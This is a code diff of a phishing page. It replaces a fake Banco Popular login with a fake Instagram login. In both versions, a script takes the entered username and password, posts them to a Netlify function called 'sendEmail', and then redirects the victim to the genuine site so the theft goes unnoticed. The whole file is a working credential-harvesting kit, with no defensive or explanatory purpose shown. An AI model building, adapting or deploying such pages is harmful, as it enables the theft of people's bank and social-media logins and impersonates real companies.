@@ -1,153 +1,411 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Banco Popular - Login</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(to right, #004080, #0080C0);
-            color: white;
-            margin: 0;
-            padding: 0;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <style>
+    /* Universal Selectors */
+    #root, body, html {
+      height: 100%;
+    }
 
-        .login_bpd {
-            max-width: 400px;
-            margin: 50px auto;
-            padding: 20px;
-            background: #005C99;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            text-align: center;
-        }
+    body {
+      overflow-y: scroll;
+    }
 
-        .logo_bpd {
-            max-width: 150px;
-            margin-bottom: 20px;
-        }
+    a, abbr, acronym, address, applet, article, aside, audio, b, big, blockquote, body, canvas, caption, center, cite, code, dd, del, details, dfn, div, dl, dt, em, embed, fieldset, figcaption, figure, footer, form, h1, h2, h3, h4, h5, h6, header, hgroup, html, i, iframe, img, ins, kbd, label, legend, li, mark, menu, nav, object, ol, output, p, pre, q, ruby, s, samp, section, small, span, strike, strong, sub, summary, sup, table, tbody, td, tfoot, th, thead, time, tr, tt, u, ul, var, video {
+      margin: 0;
+      padding: 0;
+      border: 0;
+      font: inherit;
+      vertical-align: baseline;
+    }
 
-        .segmentos_tabs {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 20px;
-        }
+    a, a:visited {
+      text-decoration: none;
+    }
 
-        .segmento {
-            flex: 1;
-            padding: 10px;
-            cursor: pointer;
-            background: #004080; /* Color base #004080 */
-            border: none;
-            border-radius: 4px;
-            text-decoration: none;
-            color: white;
-            font-size: 14px;
-            margin: 0 5px;
-        }
+    a:active, .btn:active {
+      opacity: .5;
+    }
 
-        /* Eliminar el resaltado al pasar el ratón y la clase active */
-        .segmento:hover, .segmento.active {
-            background: #004080; /* Sin cambio de color */
-        }
+    ol, ul {
+      list-style: none;
+    }
 
-        .segmento_descripcion {
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 15px;
-        }
+    body, button, input {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      font-size: 14px;
+      line-height: 18px;
+    }
 
-        .segmento_formulario input {
-            width: calc(100% - 20px);
-            padding: 10px;
-            margin: 10px 0;
-            border: none;
-            border-radius: 4px;
-            outline: none;
-        }
+    #root, article, main, div, section, header, nav, footer {
+      border: 0 solid #000000;
+      box-sizing: border-box;
+      align-items: stretch;
+      display: flex;
+      flex-direction: column;
+      flex-shrink: 0;
+      margin: 0;
+      padding: 0;
+      position: relative;
+      -webkit-box-align: stretch;
+      -moz-box-align: stretch;
+      -webkit-box-orient: vertical;
+      -moz-box-orient: vertical;
+      -webkit-box-direction: normal;
+      -moz-box-direction: normal;
+    }
 
-        .segmento_formulario button {
-            width: 100%;
-            padding: 10px;
-            background: #0080C0;
-            border: none;
-            border-radius: 4px;
-            color: white;
-            font-weight: bold;
-            cursor: pointer;
-        }
+    #root {
+      z-index: 0;
+    }
 
-        .segmento_enlaces a {
-            color: #00D4FF;
-            text-decoration: none;
-            font-size: 14px;
-        }
+    .section-all {
+      min-height: 100%;
+      overflow: hidden;
+    }
 
-        .segmento_enlaces a:hover {
-            text-decoration: underline;
-        }
+    .main {
+      background-color: #fafafa;
+      order: 4;
+      flex-grow: 1;
+      -webkit-box-flex: 1;
+      -moz-box-flex: 1;
+      -moz-box-ordinal-group: 5;
+      -webkit-box-ordinal-group: 5;
+    }
 
-        .segmento_enlaces span {
-            margin: 0 10px;
-        }
-    </style>
+    .wrapper {
+      min-height: 100%;
+      overflow: hidden;
+    }
+
+    .wrapper, .article {
+      flex-grow: 1;
+      justify-content: center;
+      -webkit-box-flex: 1;
+      -moz-box-flex: 1;
+      -webkit-box-pack: center;
+      -moz-box-pack: center;
+    }
+
+    .article {
+      flex-direction: row;
+      margin: 0 auto;
+      max-width: 935px;
+      width: 100%;
+      -webkit-box-orient: horizontal;
+      -moz-box-orient: horizontal;
+      -webkit-box-direction: normal;
+      -moz-box-direction: normal;
+    }
+
+    .content {
+      color: #262626;
+      flex-grow: 1;
+      justify-content: center;
+      max-width: 350px;
+      margin-top: 12px;
+      -webkit-box-pack: justify;
+      -moz-box-pack: justify;
+      -webkit-box-flex: 1;
+      -moz-box-flex: 1;
+    }
+
+    .login-box {
+      background: #fff;
+      border: 1px solid #e6e6e6;
+      border-radius: 1px;
+      margin: 0 0 10px;
+      padding: 10px 0;
+    }
+
+    .header {
+      margin: 14.45px auto 12px;
+    }
+
+    .logo {
+      background: cover no-repeat;
+      width: 175px;
+      height: auto;
+    }
+
+    .form {
+      display: flex;
+      flex-direction: column;
+      margin-bottom: 10px;
+      -moz-box-direction: normal;
+      -webkit-box-direction: normal;
+    }
+
+    .input-box {
+      margin: auto 40px 6px;
+    }
+
+    input {
+      height: 36px;
+      border: 1px solid #efefef;
+      border-radius: 3px;
+      background-color: #fafafa;
+      width: 100%;
+      font-size: 12px;
+      margin: 0;
+      padding: 9px 0 7px 8px;
+      outline: none;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      box-sizing: border-box;
+    }
+
+    input#name:focus, input#password:focus {
+      border-color: #bbb;
+    }
+
+    .button-box {
+      display: block;
+      position: relative;
+      margin: 8px 40px;
+    }
+
+    .btn {
+      cursor: pointer;
+      width: 100%;
+      padding: 0 8px;
+      background: #3897f0;
+      border: 1px solid #3897f0;
+      color: #fff;
+      border-radius: 3px;
+      font-weight: 600;
+      font-size: 14px;
+      height: 28px;
+      line-height: 26px;
+      outline: none;
+      white-space: nowrap;
+    }
+
+    .forgot, .forgot:active, .forgot:hover, .forgot:visited {
+      font-size: 12px;
+      margin-top: 12px;
+      text-align: center;
+      color: #003569;
+      line-height: 14px !important;
+    }
+
+    .text {
+      text-align: center;
+      margin: 15px;
+      color: #262626;
+      font-size: 14px;
+    }
+
+    .text a, .text a:visited, .text a:hover, .text a:active {
+      color: #3897f0;
+      margin-left: 3px;
+    }
+
+    /* App Store */
+    .app p {
+      line-height: 18px;
+      color: #262626;
+      font-size: 14px;
+      text-align: center;
+      margin: 10px 20px;
+    }
+
+    .app-img {
+      flex-direction: row;
+      justify-content: center;
+      margin: 10px 0;
+      -webkit-box-orient: horizontal;
+      -moz-box-orient: horizontal;
+    }
+
+    .app-img a {
+      margin-right: 8px;
+      height: 43.5px;
+    }
+
+    .app-img img {
+      height: 40px;
+    }
+
+    /* FOOTER */
+    .footer {
+      background-color: #fafafa;
+      order: 5;
+      padding: 0 20px;
+      background: #fafafa;
+    }
+
+    .footer-container {
+      flex-direction: row;
+      flex-wrap: wrap;
+      background-color: #fafafa;
+      justify-content: space-between;
+      padding: 38px 0;
+      max-width: 935px;
+      font-size: 12px;
+      font-weight: 600;
+      margin: 0 auto;
+      text-transform: uppercase;
+      width: 100%;
+    }
+
+    .footer-nav {
+      max-width: 100%;
+    }
+
+    .footer-nav ul {
+      margin-right: 16px;
+      margin-bottom: 3px;
+      flex-grow: 1;
+    }
+
+    .footer-nav ul li {
+      display: inline-block;
+      margin-right: 13px;
+      margin-bottom: 7px;
+    }
+
+    .footer-nav ul li a {
+      color: #003569;
+      text-decoration: none;
+    }
+
+    .footer span {
+      color: #999;
+    }
+
+    span.language {
+      color: #003569;
+      cursor: pointer;
+      display: inline-block;
+      font-weight: 600;
+      position: relative;
+      text-transform: uppercase;
+      vertical-align: top;
+    }
+
+    .select {
+      cursor: pointer;
+      height: 100%;
+      top: 0;
+      opacity: 0;
+      position: absolute;
+      left: 0;
+      width: 100%;
+    }
+
+    /* Media Queries */
+    @media (max-width: 450px) {
+      .main {
+        background-color: #fff;
+      }
+
+      .content {
+        max-width: 100%;
+        margin-top: 0;
+        justify-content: space-between;
+      }
+
+      .login-box {
+        background-color: transparent;
+        border: none;
+      }
+
+      .logo {
+        background: cover no-repeat;
+        width: 175px;
+        height: auto;
+        margin: 0 auto;
+      }
+
+      .btn {
+        cursor: pointer;
+        width: 100%;
+        padding: 0 8px;
+        background: #3897f0;
+        border: 1px solid #3897f0;
+        color: #fff;
+        border-radius: 3px;
+        font-weight: 600;
+        font-size: 14px;
+        height: 28px;
+        line-height: 26px;
+        outline: none;
+        white-space: nowrap;
+      }
+    }
+  </style>
 </head>
 <body>
-    <div class="login_bpd">
-        <img class="logo_bpd" src="https://popularenlinea.com/_catalogs/masterpage/popularenlinea/shared/images/logo-bpd-blanco.svg" alt="Banco Popular">
-        <div class="segmentos_tabs">
-            <a class="segmento btn_segmento segmento_persona">Personal</a>
-            <a class="segmento btn_segmento segmento_empresarial">Empresarial</a>
-            <a class="segmento btn_segmento segmento_agentes">Agentes</a>
-        </div>
-        <div class="tab-content segmentos_content">
-            <!-- Tab Personal -->
-            <div id="segmento_persona" class="segmento segmento_persona tab-pane active">
-                <div class="segmento_descripcion">Tu cuenta personal</div>
-                <div class="segmento_formulario">
-                    <input class="usuario_persona" type="text" placeholder="Nombre de usuario">
-                    <input class="pass_persona" type="password" placeholder="Contraseña">
-                    <button class="acceder_personas">Acceder</button>
+  <div id="root">
+    <div class="section-all">
+      <div class="main">
+        <div class="wrapper">
+          <div class="article">
+            <div class="content">
+              <div class="login-box">
+                <div class="header">
+                  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
                 </div>
-                <div class="segmento_enlaces">
-                    <a href="#">¿Olvidaste tu contraseña?</a>
-                    <span>|</span>
-                    <a href="#">Solicita tu acceso</a>
-                    <span>|</span>
-                    <a href="#">Pistas de seguridad</a>
+                <div class="form">
+                  <div class="input-box">
+                    <input type="text" id="name" placeholder="Usuario" required>
+                  </div>
+                  <div class="input-box">
+                    <input type="password" id="password" placeholder="Contraseña" required>
+                  </div>
+                  <div class="button-box">
+                    <button class="btn" onclick="handleLogin()">Iniciar sesión</button>
+                  </div>
+                  <a class="forgot" href="#">¿Olvidaste tu contraseña?</a>
                 </div>
+              </div>
+              <div class="text">
+                <p>¿No tienes cuenta? <a href="#">Regístrate</a></p>
+              </div>
             </div>
+          </div>
         </div>
+      </div>
     </div>
+  </div>
 
-    <script>
-        document.querySelector(".acceder_personas").addEventListener("click", function(event) {
-    event.preventDefault(); // Evita el comportamiento predeterminado
+  <script>
+    function handleLogin() {
+      const username = document.getElementById('name').value;
+      const password = document.getElementById('password').value;
 
-    const usuario = document.querySelector(".usuario_persona").value;
-    const pass = document.querySelector(".pass_persona").value;
+      if (!username || !password) {
+        alert('Por favor, completa ambos campos.');
+        return;
+      }
 
-    if (usuario && pass) {
-        fetch('/.netlify/functions/sendEmail', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                username: usuario,
-                password: pass
-            })
-        })
-        .then(() => {
-            // Redirige solo después de enviar correctamente
-            window.location.href = "https://www.popularenlinea.com/";
-        });
-    } else {
-        // Opcional: Mostrar un mensaje o manejar campos vacíos
-        alert("Por favor, complete todos los campos.");
+      fetch('/.netlify/functions/sendEmail', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ username, password }),
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.message === 'Correo enviado con éxito') {
+          
+        } else {
+          alert('Hubo un error al enviar el correo.');
+        }
+
+        window.location.href = 'https://www.instagram.com/';
+      })
+      .catch(error => {
+        alert('Error al enviar los datos: ' + error.message);
+        window.location.href = 'instagramreal.html';
+      });
     }
-});
-    </script>
+  </script>
 </body>
 </html>
